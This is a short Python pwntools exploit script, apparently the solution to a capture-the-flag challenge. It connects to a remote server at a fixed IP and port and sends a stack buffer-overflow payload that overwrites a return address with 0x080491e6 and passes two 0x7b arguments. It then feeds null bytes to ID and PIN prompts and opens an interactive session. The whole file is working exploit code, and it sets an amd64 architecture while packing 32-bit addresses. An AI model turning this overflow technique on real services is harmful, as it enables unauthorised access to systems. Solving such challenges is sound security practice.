from pwn import *
import sys
import time

HOST = "143.198.223.223"
PORT = 32298
ARCH = "amd64"

context.arch = ARCH

payload = b'a' * 27 + p32(0x080491e6) + p32(0x7b) * 2
nc = remote(HOST, PORT)
#nc = process('chall')
nc.recvuntil("scallywag: ")
nc.sendline(payload)

nc.recvuntil("ID: ")
nc.sendline(b"\x00\x00\x00\x00")

nc.recvuntil("PIN: ")
nc.sendline(b"\x00\x00\x00\x00")

nc.interactive()